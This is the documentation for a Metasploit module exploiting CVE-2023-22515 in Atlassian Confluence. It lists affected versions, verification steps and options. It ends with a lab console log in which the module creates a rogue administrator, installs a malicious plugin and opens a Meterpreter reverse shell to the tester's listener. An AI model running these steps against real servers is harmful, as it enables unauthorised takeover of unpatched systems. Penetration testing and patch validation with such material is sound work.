## Vulnerable Application
This module exploits an improper input validation issue in Atlassian Confluence, allowing arbitrary HTTP
parameters to be translated into getter/setter sequences via the XWorks2 middleware and in turn allows for
Java objects to be modified at run time. The exploit will create a new administrator user and  upload a
malicious plugins to get arbitrary code execution. All versions of Confluence between 8.0.0 through to 8.3.2,
8.4.0 through to 8.4.2, and 8.5.0 through to 8.5.1 are affected.

For a full technical analysis of the vulnerability read the
[Rapid7 AttackerKB Analysis](https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis).

## Testing
Download and install a [vulnerable version of Atlassian Confluence](https://www.atlassian.com/software/confluence/download.).
By default the server will listen for HTTP connections on port 8090. This exploit module was tested against Confluence
8.5.1 running on Windows Server 2022.

## Verification Steps
Note: Disable Defender if you are using the default payloads.

Steps:
1. Start msfconsole
2. `use exploit/multi/http/atlassian_confluence_rce_cve_2023_22515`
3. `set RHOST 192.168.86.50`
4. `check`
5. `exploit`

## Options

### TARGETURI

The base path for the target servers Confluence installation. By default this option is set to `/`.

### CONFLUENCE_TARGET_ENDPOINT

This is the endpoint used to trigger the vulnerability, and must be reachable by an un authenticated HTTP(S) POST
request. Any Confluence Action endpoint that extends the base class `ConfluenceActionSupport` is likely to work. Two
example endpoints that have been tested are `server-info.action` and `ajax/spaceavailable.action`. By default this
option is set to `server-info.action`.

### CONFLUENCE_PLUGIN_TIMEOUT

The exploit will install a malicious plugin into the Confluence server. Plugin installation is performed asynchronously
and we must poll the server to find out when installation has completed. This option governs the maximum amount
of time to wait for installation to complete. The timeout value is in seconds and by default this option is set to `30`.

## Scenarios

### Automatic
```
msf6 exploit(multi/http/atlassian_confluence_rce_cve_2023_22515) > show options

Module options (exploit/multi/http/atlassian_confluence_rce_cve_2023_22515):

   Name                        Current Setting     Required  Description
   ----                        ---------------     --------  -----------
   CONFLUENCE_PLUGIN_TIMEOUT   30                  yes       The timeout to wait when installing a plugin
   CONFLUENCE_TARGET_ENDPOINT  server-info.action  yes       The endpoint used to trigger the vulnerability.
   Proxies                                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      192.168.86.50       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metas
                                                             ploit.html
   RPORT                       8090                yes       The target port (TCP)
   SSL                         false               no        Negotiate SSL/TLS for outgoing connections
   TARGETURI                   /                   yes       Base path for Confluence
   VHOST                                           no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.86.42    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/atlassian_confluence_rce_cve_2023_22515) > check
[*] 192.168.86.50:8090 - The target appears to be vulnerable. Atlassian Confluence 8.5.1
msf6 exploit(multi/http/atlassian_confluence_rce_cve_2023_22515) > exploit

[*] Started reverse TCP handler on 192.168.86.42:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Atlassian Confluence 8.5.1
[*] Setting the application configuration's setupComplete to false via endpoint: /server-info.action
[*] Creating a new administrator user account...
[*] Created zskghlfv:NDqbcj4N
[*] Adding a malicious plugin...
[*] Waiting for plugin to be installed...
[*] Triggering payload...
[*] Deleting plugin...
[*] Sending stage (57692 bytes) to 192.168.86.50
[*] Meterpreter session 1 opened (192.168.86.42:4444 -> 192.168.86.50:56898) at 2023-10-16 20:41:57 +0100

meterpreter > getuid
Server username: WIN-V28QNSO2H05$
meterpreter > sysinfo
Computer        : WIN-V28QNSO2H05
OS              : Windows Server 2022 10.0 (amd64)
Architecture    : x64
System Language : en_IE
Meterpreter     : java/windows
meterpreter > pwd
C:\Program Files\Atlassian\Confluence
meterpreter > 
```
